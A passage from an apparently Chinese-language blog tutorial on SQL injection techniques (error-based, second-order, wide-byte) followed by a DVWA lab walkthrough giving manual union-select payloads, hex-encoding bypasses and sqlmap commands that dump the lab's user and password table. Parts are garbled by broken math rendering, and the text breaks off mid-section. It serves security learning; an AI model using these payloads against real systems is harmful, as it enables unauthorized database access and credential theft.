limit <span class="token punctuation">[</span>offset，<span class="token punctuation">]</span> rows	// offset 指定从哪一行开始返回，初始行的偏移量为0；rows 指定返回具体行数

ascii<span class="token punctuation">(</span><span class="token punctuation">)</span>	// 将某个字符转换为 ASCII 码值

if<span class="token punctuation">(</span>exp1, exp2, exp3<span class="token punctuation">)</span>	// 如果 exp1 正确，就执行 exp2 ，否则执行 exp3；搭配 sleep<span class="token punctuation">(</span><span class="token punctuation">)</span> 使用

sleep<span class="token punctuation">(</span>time<span class="token punctuation">)</span>	// 休眠多少秒

concat<span class="token punctuation">(</span>str1, str2,<span class="token punctuation">..</span>.<span class="token punctuation">)</span>	// 将多个字符串连接成一个字符串，保持原有行数

concat_ws<span class="token punctuation">(</span>separator, str1, str2, <span class="token punctuation">..</span>.<span class="token punctuation">)</span>	// 将多个字符串连接成一个字符串，但是可以一次性指定分隔符，保持原有行数

group_concat<span class="token punctuation">(</span>str1, str2,<span class="token punctuation">..</span>.<span class="token punctuation">)</span>	// 将多个字符串连接成一个字符串，合并到一行
</code></pre> 
<p><strong>6.2、报错注入</strong></p> 
<pre><code class="prism language-bash"><span class="token number">1</span>.简介
一般是页面没有回显，但是SQL语句执行可以输出错误信息的情况。报错注入就是利用了数据库的某些机制，人为地制造错误条件，使得查询结果能够出现在错误信息中。

<span class="token number">2</span>.注意：报错注入最好用 and ，因为我们目的是让其产生报错信息。

<span class="token number">3</span>.Xpath类型函数<span class="token punctuation">(</span>mysql version <span class="token operator">&gt;=</span> <span class="token number">5.1</span>.5<span class="token punctuation">)</span>：
extractvalue <span class="token punctuation">(</span>XML_document, XPath_string<span class="token punctuation">)</span>
 - 第一个参数：XML_document 是目标XML文档
 - 第二个参数：XPath_string 是该XML文档的路径，如果写入其他格式就会报错，并且返回非法格式的内容，报错注入正是利用这一点

updatexml <span class="token punctuation">(</span>XML_document, XPath_string, new_value<span class="token punctuation">)</span>
 - 第一个参数：XML_document 是目标XML文档
 - 第二个参数：XPath_string 是该XML文档的路径，如果写入其他格式就会报错，并且返回非法格式的内容，报错注入正是利用这一点
 - 第三个参数：new_value 用来替换查找到的符合条件的数据
</code></pre> 
<h5><a id="7_292"></a>7、关于二次注入</h5> 
<p><strong>7.1、介绍</strong></p> 
<pre><code class="prism language-bash"><span class="token number">1</span>.简介
指已存储（数据库、文件）的用户输入被读取后再次进入到 SQL 查询语句中导致的注入

<span class="token number">2</span>.补充
mysql_escape_string<span class="token punctuation">(</span><span class="token punctuation">)</span>函数，该函数和mysql_real_escape_string一样可以转移特殊字符，但不同的是经过mysql_escape_string处理的参数在存入数据库时会被还原成原来的数据

<span class="token number">3</span>.场景
设想在登录页面username和password都经过了mysql_real_escape_string函数的转义，无法造成SQL注入。但注册页面使用的是mysql_escape_string函数，那么我们注册一个名为admin<span class="token string">'#的用户，密码设为admin，登录该用户后，在修改密码页面修改密码为123456，这时admin'</span><span class="token comment">#的密码没有被修改，反而是admin的密码被修改了。</span>

<span class="token number">4</span>.原理
后端数据库执行的命令为，UPDATE <span class="token function">users</span> SET <span class="token assign-left variable">PASSWORD</span><span class="token operator">=</span><span class="token string">'123456’ where username='</span>admin<span class="token string">'#'</span> and <span class="token assign-left variable">password</span><span class="token operator">=</span><span class="token string">'admin'</span>，等价于，UPDATE <span class="token function">users</span> SET <span class="token assign-left variable">PASSWORD</span><span class="token operator">=</span><span class="token string">'123456'</span> where <span class="token assign-left variable">username</span><span class="token operator">=</span><span class="token string">'admin'</span>
最后我们看到的是将admin的账户密码修改为了123456而admin<span class="token string">'#并没有发生改变，原因是代码执行的过程中将'</span><span class="token comment">#没有过滤直接带入执行导致'与前面的代码闭合而#将后面的代码给注释。</span>
</code></pre> 
<p><strong>7.2、原理示意图</strong><br> <img src="https://images2.imgbox.com/ca/5f/dJKmiRrJ_o.png" alt="在这里插入图片描述"></p> 
<p><strong>7.3、场景图</strong><br> <img src="https://images2.imgbox.com/58/12/Za4y44lQ_o.png" alt="在这里插入图片描述"></p> 
<p><img src="https://images2.imgbox.com/bb/0b/XYdsui2Z_o.png" alt="在这里插入图片描述"></p> 
<h5><a id="8df_317"></a>8、关于宽字节注入（%df’)</h5> 
<p><strong>8.1、前言</strong></p> 
<pre><code class="prism language-bash"><span class="token number">1</span>.当某字符的大小为一个字节时，称其字符为窄字节
<span class="token number">2</span>.当某字符的大小为两个字节时，称其字符为宽字节
<span class="token number">3</span>.所有英文默认占一个字节，汉字占两个字节
<span class="token number">4</span>.常见的宽字节编码：GB2312,GBK,GB18030,BIG5,Shift_JIS
</code></pre> 
<p><strong>8.2、原理</strong></p> 
<pre><code class="prism language-bash"> MySQL数据库编码与PHP编码不同导致，如MySQL数据库使用GBK编码而PHP编码为UTF8。MySQL认为两个字符是一个汉字（前一个字符ascii码要大于128，如%df），而当我们输入%df和单引号（%df<span class="token string">'）时，MySQL会调用转义函数如addslashes，将单引号转义（添加 \ ）后整个为 %df\'</span> ，其中 <span class="token punctuation">\</span> 的十六进制是%5c，即 %df%5c' ，而MySQL的GBK编码会认为%df%5c是一个汉字（運<span class="token punctuation">)</span>，而此时单引号仍然存在，可以实现闭合，从而造成SQL注入。
</code></pre> 
<p><img src="https://images2.imgbox.com/df/a0/VfNVXxYO_o.png" alt="在这里插入图片描述"><br> <strong>参考链接：</strong> <a href="https://blog.csdn.net/lza20001103/article/details/124286601?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522167859240016782425174405%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=167859240016782425174405&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-124286601-null-null.142%5Ev73%5Einsert_down4,201%5Ev4%5Eadd_ask,239%5Ev2%5Einsert_chatgpt&amp;utm_term=%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5&amp;spm=1018.2226.3001.4187">渗透测试-SQL注入之宽字节注入</a></p> 
<h3><a id="DVWA_SQL_335"></a>DVWA 普通手工SQL注入</h3> 
<p><strong>1、Low级别</strong><br> <strong>1.1、代码分析</strong></p> 
<p>查看前端代码：发现是一个form表单，有id和submit两个参数，并且以GET方式提交。<br> <img src="https://images2.imgbox.com/fd/52/mkTHKwLB_o.png" alt="在这里插入图片描述"><br> 查看后端PHP代码：</p> 
<ul><li>isset( $_REQUEST[ ‘Submit’ ] ) // 判断Submit变量是否存在</li><li>$id = <span class="katex--inline"><span class="katex"><span class="katex-mathml"> 
      
       
        
         
          
         
           R 
          
         
        
          E 
         
        
          Q 
         
        
          U 
         
        
          E 
         
        
          S 
         
        
          T 
         
         
         
           [ 
          
         
           ′ 
          
         
        
          i 
         
         
         
           d 
          
         
           ′ 
          
         
        
          ] 
         
        
          / 
         
        
          / 
         
        
          获取 
         
        
          i 
         
        
          d 
         
        
          变量的值并赋值给变量 
         
        
       
         _REQUEST[ 'id' ] // 获取id变量的值并赋值给变量 
        
       
     </span><span class="katex-html"><span class="base"><span class="strut" style="height: 1.0019em; vertical-align: -0.25em;"></span><span class="mord"><span class=""></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.3283em;"><span class="" style="top: -2.55em; margin-right: 0.05em;"><span class="pstrut" style="height: 2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right: 0.0077em;">R</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em;"><span class=""></span></span></span></span></span></span><span class="mord mathnormal">EQ</span><span class="mord mathnormal" style="margin-right: 0.109em;">U</span><span class="mord mathnormal" style="margin-right: 0.1389em;">EST</span><span class="mopen"><span class="mopen">[</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height: 0.7519em;"><span class="" style="top: -3.063em; margin-right: 0.05em;"><span class="pstrut" style="height: 2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mord mathnormal">i</span><span class="mord"><span class="mord mathnormal">d</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height: 0.7519em;"><span class="" style="top: -3.063em; margin-right: 0.05em;"><span class="pstrut" style="height: 2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mclose">]</span><span class="mord">//</span><span class="mord cjk_fallback">获取</span><span class="mord mathnormal">i</span><span class="mord mathnormal">d</span><span class="mord cjk_fallback">变量的值并赋值给变量</span></span></span></span></span>id</li><li><span class="katex--inline"><span class="katex"><span class="katex-mathml"> 
      
       
        
        
          q 
         
        
          u 
         
        
          e 
         
        
          r 
         
        
          y 
         
        
          = 
         
        
          " 
         
        
          S 
         
        
          E 
         
        
          L 
         
        
          E 
         
        
          C 
         
        
          T 
         
        
          f 
         
        
          i 
         
        
          r 
         
        
          s 
         
         
         
           t 
          
         
           n 
          
         
        
          a 
         
        
          m 
         
        
          e 
         
        
          , 
         
        
          l 
         
        
          a 
         
        
          s 
         
         
         
           t 
          
         
           n 
          
         
        
          a 
         
        
          m 
         
        
          e 
         
        
          F 
         
        
          R 
         
        
          O 
         
        
          M 
         
        
          u 
         
        
          s 
         
        
          e 
         
        
          r 
         
        
          s 
         
        
          W 
         
        
          H 
         
        
          E 
         
        
          R 
         
        
          E 
         
        
          u 
         
        
          s 
         
        
          e 
         
         
         
           r 
          
         
           i 
          
         
        
          d 
         
         
         
           = 
          
         
           ′ 
          
         
        
       
         query = "SELECT first_name, last_name FROM users WHERE user_id = ' 
        
       
     </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.625em; vertical-align: -0.1944em;"></span><span class="mord mathnormal" style="margin-right: 0.0359em;">q</span><span class="mord mathnormal">u</span><span class="mord mathnormal" style="margin-right: 0.0359em;">ery</span><span class="mspace" style="margin-right: 0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right: 0.2778em;"></span></span><span class="base"><span class="strut" style="height: 0.9463em; vertical-align: -0.1944em;"></span><span class="mord">"</span><span class="mord mathnormal" style="margin-right: 0.0576em;">SE</span><span class="mord mathnormal">L</span><span class="mord mathnormal" style="margin-right: 0.1389em;">ECT</span><span class="mord mathnormal" style="margin-right: 0.1076em;">f</span><span class="mord mathnormal">i</span><span class="mord mathnormal">rs</span><span class="mord"><span class="mord mathnormal">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.1514em;"><span class="" style="top: -2.55em; margin-left: 0em; margin-right: 0.05em;"><span class="pstrut" style="height: 2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em;"><span class=""></span></span></span></span></span></span><span class="mord mathnormal">am</span><span class="mord mathnormal">e</span><span class="mpunct">,</span><span class="mspace" style="margin-right: 0.1667em;"></span><span class="mord mathnormal" style="margin-right: 0.0197em;">l</span><span class="mord mathnormal">a</span><span class="mord mathnormal">s</span><span class="mord"><span class="mord mathnormal">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.1514em;"><span class="" style="top: -2.55em; margin-left: 0em; margin-right: 0.05em;"><span class="pstrut" style="height: 2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em;"><span class=""></span></span></span></span></span></span><span class="mord mathnormal">am</span><span class="mord mathnormal">e</span><span class="mord mathnormal" style="margin-right: 0.109em;">FROM</span><span class="mord mathnormal">u</span><span class="mord mathnormal">sers</span><span class="mord mathnormal" style="margin-right: 0.1389em;">W</span><span class="mord mathnormal" style="margin-right: 0.0813em;">H</span><span class="mord mathnormal" style="margin-right: 0.0576em;">ERE</span><span class="mord mathnormal">u</span><span class="mord mathnormal">se</span><span class="mord"><span class="mord mathnormal" style="margin-right: 0.0278em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.3117em;"><span class="" style="top: -2.55em; margin-left: -0.0278em; margin-right: 0.05em;"><span class="pstrut" style="height: 2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em;"><span class=""></span></span></span></span></span></span><span class="mord mathnormal">d</span><span class="mspace" style="margin-right: 0.2778em;"></span><span class="mrel"><span class="mrel">=</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height: 0.7519em;"><span class="" style="top: -3.063em; margin-right: 0.05em;"><span class="pstrut" style="height: 2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span></span></span></span></span>id’;" //将查询语句字符串赋值给变量$query</li><li><span class="katex--inline"><span class="katex"><span class="katex-mathml"> 
      
       
        
        
          r 
         
        
          e 
         
        
          s 
         
        
          u 
         
        
          l 
         
        
          t 
         
        
          = 
         
        
          m 
         
        
          y 
         
        
          s 
         
        
          q 
         
        
          l 
         
         
         
           i 
          
         
           q 
          
         
        
          u 
         
        
          e 
         
        
          r 
         
        
          y 
         
        
          ( 
         
        
       
         result = mysqli_query( 
        
       
     </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.6944em;"></span><span class="mord mathnormal">res</span><span class="mord mathnormal">u</span><span class="mord mathnormal">lt</span><span class="mspace" style="margin-right: 0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right: 0.2778em;"></span></span><span class="base"><span class="strut" style="height: 1.0361em; vertical-align: -0.2861em;"></span><span class="mord mathnormal">m</span><span class="mord mathnormal">ys</span><span class="mord mathnormal" style="margin-right: 0.0197em;">ql</span><span class="mord"><span class="mord mathnormal">i</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.1514em;"><span class="" style="top: -2.55em; margin-left: 0em; margin-right: 0.05em;"><span class="pstrut" style="height: 2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right: 0.0359em;">q</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.2861em;"><span class=""></span></span></span></span></span></span><span class="mord mathnormal">u</span><span class="mord mathnormal" style="margin-right: 0.0359em;">ery</span><span class="mopen">(</span></span></span></span></span>GLOBALS[“___mysqli_ston”], <span class="katex--inline"><span class="katex"><span class="katex-mathml"> 
      
       
        
        
          q 
         
        
          u 
         
        
          e 
         
        
          r 
         
        
          y 
         
        
          ) 
         
        
          o 
         
        
          r 
         
        
          d 
         
        
          i 
         
        
          e 
         
         
         
           ( 
          
         
           ′ 
          
         
        
          &lt; 
         
        
          p 
         
        
          r 
         
        
          e 
         
         
         
           &gt; 
          
         
           ′ 
          
         
        
          . 
         
        
          ( 
         
        
          ( 
         
        
          i 
         
         
         
           s 
          
         
           o 
          
         
        
          b 
         
        
          j 
         
        
          e 
         
        
          c 
         
        
          t 
         
        
          ( 
         
        
       
         query ) or die( '&lt;pre&gt;' . ((is_object( 
        
       
     </span><span class="katex-html"><span class="base"><span class="strut" style="height: 1.0019em; vertical-align: -0.25em;"></span><span class="mord mathnormal" style="margin-right: 0.0359em;">q</span><span class="mord mathnormal">u</span><span class="mord mathnormal" style="margin-right: 0.0359em;">ery</span><span class="mclose">)</span><span class="mord mathnormal" style="margin-right: 0.0278em;">or</span><span class="mord mathnormal">d</span><span class="mord mathnormal">i</span><span class="mord mathnormal">e</span><span class="mopen"><span class="mopen">(</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height: 0.7519em;"><span class="" style="top: -3.063em; margin-right: 0.05em;"><span class="pstrut" style="height: 2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right: 0.2778em;"></span></span><span class="base"><span class="strut" style="height: 0.9463em; vertical-align: -0.1944em;"></span><span class="mord mathnormal">p</span><span class="mord mathnormal">re</span><span class="mspace" style="margin-right: 0.2778em;"></span><span class="mrel"><span class="mrel">&gt;</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height: 0.7519em;"><span class="" style="top: -3.063em; margin-right: 0.05em;"><span class="pstrut" style="height: 2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right: 0.2778em;"></span></span><span class="base"><span class="strut" style="height: 1em; vertical-align: -0.25em;"></span><span class="mord">.</span><span class="mopen">((</span><span class="mord mathnormal">i</span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.1514em;"><span class="" style="top: -2.55em; margin-left: 0em; margin-right: 0.05em;"><span class="pstrut" style="height: 2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">o</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em;"><span class=""></span></span></span></span></span></span><span class="mord mathnormal" style="margin-right: 0.0572em;">bj</span><span class="mord mathnormal">ec</span><span class="mord mathnormal">t</span><span class="mopen">(</span></span></span></span></span>GLOBALS[“___mysqli_ston”]))… <br> //执行查询语句，若出错则会输出错误信息。返回的结果集赋值给变量$result<br> <img src="https://images2.imgbox.com/b5/e5/CVxGMF4q_o.png" alt="在这里插入图片描述"></li></ul> 
<p>将结果集中first_name和last_name字段的值分别赋值给变量<span class="katex--inline"><span class="katex"><span class="katex-mathml"> 
     
      
       
       
         f 
        
       
         i 
        
       
         r 
        
       
         s 
        
       
         t 
        
       
         和变量 
        
       
      
        first和变量 
       
      
    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.8889em; vertical-align: -0.1944em;"></span><span class="mord mathnormal" style="margin-right: 0.1076em;">f</span><span class="mord mathnormal">i</span><span class="mord mathnormal">rs</span><span class="mord mathnormal">t</span><span class="mord cjk_fallback">和变量</span></span></span></span></span>last，并打印输出。<br> <img src="https://images2.imgbox.com/4a/cc/aalgFlM0_o.png" alt="在这里插入图片描述"></p> 
<p><strong>1.2、Poc</strong><br> 输入单引号查询，页面报错，判断存在SQL注入。<br> <img src="https://images2.imgbox.com/5b/c3/CXCPl8wu_o.png" alt="在这里插入图片描述"></p> 
<p>如何判断是字符型还是数值型的方法，参考此链接：<a href="https://blog.csdn.net/qq_44798520/article/details/122453649">sql注入_字符型、数字型判断</a><br> <img src="https://images2.imgbox.com/01/dc/oF1WTOEa_o.png" alt="在这里插入图片描述"></p> 
<p>输入1查询出的用户为admin，输入1+2查询出的用户还是admin，判断是字符型SQL注入。<br> 或者<br> 输入1 and 1=2 页面回显正常，判断是字符型SQL注入。</p> 
<p><strong>1.3、注入流程</strong><br> <strong>1.3.1、猜字段数</strong><br> 1’ order by 1# 和 1’ order by 2# 回显正常，1’ order by 3# 报错，由此得到字段数目为2。使用#是注释掉后面那个单引号。<br> <img src="https://images2.imgbox.com/61/b6/k5J2I2zt_o.png" alt="在这里插入图片描述"><br> <img src="https://images2.imgbox.com/18/34/W3biJuu6_o.png" alt="在这里插入图片描述"><br> <img src="https://images2.imgbox.com/7c/2c/ccNAKYs9_o.png" alt="在这里插入图片描述"></p> 
<p><strong>1.3.2、判断可显示字段</strong><br> 通过联合查询判断哪些字段可以显示出来：’ union select 1,2#<br> 可以看到字段1和字段2都可以被显示出来<br> <img src="https://images2.imgbox.com/49/d9/eysErzdL_o.png" alt="在这里插入图片描述"></p> 
<p><strong>1.3.3、利用MySQL内置函数查询用户名和数据库名</strong><br> 输入：’ union select user(),database()#<br> 得到当前用户名为root@localhost，数据库名为dvwa。<br> <img src="https://images2.imgbox.com/7f/3a/Q5mqxdAl_o.png" alt="在这里插入图片描述"></p> 
<p><strong>1.3.4、利用information_schema查询数据库名、表名、字段名</strong></p> 
<p>information_schema的三个表 SCHEMA，TABLES，COLUMNS 分别记录有系统上的数据库名，各个数据库的表名，各个表里面的字段名</p> 
<p>这里需要先改一下dvwa数据库的排序规则，要和information_schema数据库的一致才行，即由 utf8_unicode_ci 改为 utf8_general_ci<br> 具体操作为：phpMyAdmin - dvwa - 操作 - 排序规则 - 改为utf8_general_ci</p> 
<p><strong>获取全部数据库名称信息</strong>：’ union select 1,SHCEMA_NAME from information_schema.SCHEMA #<br> 补充，这里我出现报错信息：Illegal mix of collations for operation ‘UNION’，解决办法参考此链接：<a href="https://blog.csdn.net/qq_44897193/article/details/106516838">sql注入时union出错（Illegal mix of collations for operation UNION）</a><br> <img src="https://images2.imgbox.com/eb/90/O2eoGG1M_o.png" alt="在这里插入图片描述"><br> 可以看到有4个数据库，分别为information_schema，dvwa，mysql，performance_schema，sys，我们接着对名为dvwa的数据库进行SQL注入。</p> 
<p><strong>获取表名</strong>：’ union select 1,TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA=‘dvwa’ #<br> <img src="https://images2.imgbox.com/6e/86/sc8tTMSn_o.png" alt="在这里插入图片描述"><br> 可以看到dvwa数据库有两个表，分别为guestbook，users，很明显用户名和密码是在users表里面，我们继续对users表SQL注入。</p> 
<p><strong>获取字段名</strong>：'union select 1,COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME = ‘users’ #</p> 
<p><img src="https://images2.imgbox.com/3d/e1/h5wBBuUi_o.png" alt="在这里插入图片描述"><br> 可以看到有许多字段，其中user和password正是我们需要的。</p> 
<p>这里可以用group_concat()函数，使返回的结果更加醒目：‘union select 1,group_concat(COLUMN_NAME) from information_schema.COLUMNS where TABLE_NAME = ‘users’ #<br> 或者使用limit限制输出个数：’ union select 1,COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME = ‘users’ limit 0,1 #<br> <img src="https://images2.imgbox.com/b0/76/ptqJcbSH_o.png" alt="在这里插入图片描述"><br> <img src="https://images2.imgbox.com/0c/d5/AqVt3p4J_o.png" alt="在这里插入图片描述"><br> <strong>最后爆出用户名和密码</strong>：’ union select user,password from users#<br> <img src="https://images2.imgbox.com/90/a3/YPz7UEdI_o.png" alt="在这里插入图片描述"></p> 
<p><strong>2、Medium级别</strong><br> <strong>2.1、代码分析</strong><br> 通过分析前后端代码发现，Medium等级和Low等级的区别在于：</p> 
<ul><li>Medium等级的表单通过POST方式提交，所以我们需要使用BurpSuite进行抓包。</li><li>在Medium级别的PHP代码里面，出现了mysqli_real_escape_string()函数，该函数的作用是转义 SQL 语句字符串中的特殊字符，如单引号【'】，双引号【"】，反斜杠【\】，百分号【%】、空字符【null】等等，转义的方式是在这些特殊字符前加上一个反斜杠【\】。</li><li>SQL语句中的变量$id是数值型，采取数值型的注入。</li></ul> 
<p><img src="https://images2.imgbox.com/98/73/2gmF2cBL_o.png" alt="在这里插入图片描述"><br> <img src="https://images2.imgbox.com/8f/3d/43JGwKhM_o.png" alt="在这里插入图片描述"><br> <img src="https://images2.imgbox.com/bf/9f/3ihKql9g_o.png" alt="在这里插入图片描述"></p> 
<p><strong>2.2、Poc</strong></p> 
<ul><li> <p>输入单引号查询，页面报错，判断存在SQL注入。</p> </li><li> <p>输入1 and 1=2，页面回显错误，判断存在数值型SQL注入。</p> </li></ul> 
<p><strong>2.3、注入流程</strong><br> <strong>2.3.1、猜字段数和判断回显点和Low级别基本无差异，且不用考虑闭合单引号的问题，不做多的解释</strong></p> 
<p><strong>2.3.2、利用MySQL内置函数查询用户名和数据库名，且不用考虑闭合单引号的问题，不做多的解释</strong></p> 
<p><strong>2.3.3、利用information_schema爆出表名、字段名</strong></p> 
<p><strong>爆表名：</strong><br> union select 1,TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA=0x64767761<br> 因为 mysqli_real_escape_string() 函数会转义单引号，所以使用 16进制 进行绕过，dvwa 的16进制表示为 0x64767761<br> <img src="https://images2.imgbox.com/db/7c/8uE15nAV_o.png" alt="在这里插入图片描述"><br> <img src="https://images2.imgbox.com/79/16/wmBdotpO_o.png" alt="在这里插入图片描述"></p> 
<p><strong>爆字段名：</strong><br> union select 1,group_concat(COLUMN_NAME) from information_schema.COLUMNS where TABLE_NAME=0x7573657273<br> 同样，因为 mysqli_real_escape_string() 函数会转义单引号，所以使用 16进制 进行绕过，users 的16进制表示为 0x7573657273</p> 
<p><img src="https://images2.imgbox.com/fe/97/VGC6lheQ_o.png" alt="在这里插入图片描述"><br> <img src="https://images2.imgbox.com/32/85/3vvWnbZE_o.png" alt="在这里插入图片描述"></p> 
<p><strong>2.3.4、爆用户名、密码</strong></p> 
<p>union select user,password from users<br> <img src="https://images2.imgbox.com/aa/bb/o4JkGwsQ_o.png" alt="在这里插入图片描述"></p> 
<p><strong>3、High级别</strong><br> High级别是在新的页面输入内容，查看源码发现只是比Low级别多了个 limit 1 来限制只输出一条，其他和Low级别一样。<br> <img src="https://images2.imgbox.com/4e/c8/Hn6DJOMm_o.png" alt="在这里插入图片描述"><br> 而且查询提交页面与查询结果显示页面不是同一个，也没有执行302跳转，这样做的目的是为了防止一般的sqlmap注入（自动化注入），因为sqlmap在注入过程中，无法在查询提交页面上获取查询的结果，没有了反馈，也就没办法进一步注入。</p> 
<p><strong>4、Impossible级别</strong><br> 我们可以看到代码采用了PDO技术，划清了代码与数据的界限，有效防御SQL注入。</p> 
<p><strong>Check Anti-CSRF token部分：</strong><br> 防止CSRF攻击，Token 是在服务端产生的。如果前端使用用户名/密码向服务端请求认证，服务端认证成功，那么在服务端会返回 Token 给前端。前端可以在每次请求的时候带上 Token 证明自己的合法地位</p> 
<p><strong>Was a number entered?部分：</strong><br> is_numeric() 函数用于检测变量是否为数字或数字字符串。<br> $data = $db-&gt;prepare预编译sql语句，能防止sql注入。</p> 
<p><strong>Make sure only 1 result is returned部分：</strong><br> $data-&gt;rowCount() == 1限制了只返回一条语句。<br> <img src="https://images2.imgbox.com/a0/d8/tGPpFEKr_o.png" alt="在这里插入图片描述"></p> 
<h3><a id="DVWA_sqlmapSQL_471"></a>DVWA sqlmap工具实现SQL注入</h3> 
<p><strong>1、Low级别</strong><br> <strong>1.1、找注入点</strong></p> 
<pre><code class="prism language-bash">python sqlmap.py -u <span class="token string">"http://192.168.124.91/DVWA/vulnerabilities/sqli/?id=1&amp;Submit=Submit#"</span>
</code></pre> 
<p><img src="https://images2.imgbox.com/df/75/jmaHGMq3_o.png" alt="在这里插入图片描述"></p> 
<p>可以看到页面需要 cookie 来认证身份，通过 burpsuite 抓包得到 cookie</p> 
<p><img src="https://images2.imgbox.com/f8/37/6zza8j8J_o.png" alt="在这里插入图片描述"></p> 
<p>将 cookie 添加进去</p> 
<pre><code class="prism language-bash">python sqlmap.py -u <span class="token string">"http://192.168.124.91/DVWA/vulnerabilities/sqli/?id=1&amp;Submit=Submit#"</span> --cookie<span class="token operator">=</span><span class="token string">"security=low; PHPSESSID=shmh08p3tkd0metej9r2f87ada"</span>
</code></pre> 
<p><img src="https://images2.imgbox.com/89/e9/fS79sfKG_o.png" alt="在这里插入图片描述"></p> 
<p><strong>1.2、爆数据库</strong></p> 
<pre><code class="prism language-bash">python sqlmap.py -u <span class="token string">"http://192.168.124.91/DVWA/vulnerabilities/sqli/?id=1&amp;Submit=Submit#"</span> --cookie<span class="token operator">=</span><span class="token string">"security=low; PHPSESSID=shmh08p3tkd0metej9r2f87ada"</span> -dbs
</code></pre> 
<p><img src="https://images2.imgbox.com/52/ce/OUuDj4ZG_o.png" alt="在这里插入图片描述"></p> 
<p><strong>1.3、爆表名</strong></p> 
<pre><code class="prism language-bash">python sqlmap.py -u <span class="token string">"http://192.168.124.91/DVWA/vulnerabilities/sqli/?id=1&amp;Submit=Submit#"</span> --cookie<span class="token operator">=</span><span class="token string">"security=low; PHPSESSID=shmh08p3tkd0metej9r2f87ada"</span> -D dvwa -tables
</code></pre> 
<p><img src="https://images2.imgbox.com/02/6a/AEAh4cru_o.png" alt="在这里插入图片描述"></p> 
<p><strong>1.4、爆字段名</strong></p> 
<pre><code class="prism language-bash">python sqlmap.py -u <span class="token string">"http://192.168.124.91/DVWA/vulnerabilities/sqli/?id=1&amp;Submit=Submit#"</span> --cookie<span class="token operator">=</span><span class="token string">"security=low; PHPSESSID=shmh08p3tkd0metej9r2f87ada"</span> -D dvwa -T <span class="token function">users</span> --columns
</code></pre> 
<p><img src="https://images2.imgbox.com/6f/55/lQNImhfJ_o.png" alt="在这里插入图片描述"></p> 
<p><strong>1.5、获取用户名、密码</strong></p> 
<pre><code class="prism language-bash">python sqlmap.py -u <span class="token string">"http://192.168.124.91/DVWA/vulnerabilities/sqli/?id=1&amp;Submit=Submit#"</span> --cookie<span class="token operator">=</span><span class="token string">"security=low; PHPSESSID=shmh08p3tkd0metej9r2f87ada"</span> -D dvwa -T <span class="token function">users</span> -C user,password --dump
</code></pre> 
<p><img src="https://images2.imgbox.com/b1/46/CVvHeNAw_o.png" alt="在这里插入图片描述"></p> 
<p><strong>2、Medium级别</strong><br> Medium 级别的表单通过 POST 方式提交，需要使用 --data 参数把数据引入过来，再改一下cookie，其余和 Low 级别一样。<br> <img src="https://images2.imgbox.com/ec/be/gyY9eAhO_o.png" alt="在这里插入图片描述"></p> 
<p><strong>爆库名：</strong></p> 
